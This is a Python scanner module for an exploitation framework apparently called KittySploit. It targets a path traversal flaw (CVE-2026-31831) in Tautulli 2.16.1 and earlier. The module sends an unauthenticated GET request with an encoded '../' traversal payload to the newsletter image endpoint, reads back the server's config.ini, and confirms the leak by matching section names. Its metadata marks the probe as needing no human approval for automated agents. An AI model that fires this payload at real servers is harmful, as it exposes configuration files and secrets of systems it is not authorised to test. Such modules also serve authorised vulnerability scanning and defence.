#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tautulli <= 2.16.1 - Path Traversal"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Tautulli <= 2.16.1 - Path Traversal",
        "description": "Unauthenticated LFI via /newsletter/image/images reads config.ini.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-31831",
        "tags": ["web", "scanner", "cve", "cve2026", "vuln", "tautulli", "lfi", "traversal"],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://github.com/Tautulli/Tautulli/security/advisories/GHSA-xp55-2pf4-fv8m",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-31831",
        ],
    }

    def run(self):
        path = "/newsletter/image/images/..%2F..%2F..%2F..%2F..%2F..%2Fconfig%2Fconfig.ini"
        r = self.http_request(method="GET", path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        # Nuclei matches image/png content-type with ini body (odd but keep both signals)
        if not all(m in body for m in ("[General]", "[PMS]", "pms_identifier")):
            return False
        self.set_info(
            severity="high",
            cve="CVE-2026-31831",
            reason="Tautulli newsletter image path traversal exposed config.ini",
            path=path,
            content_type=ctype,
            confidence="high",
        )
        return True
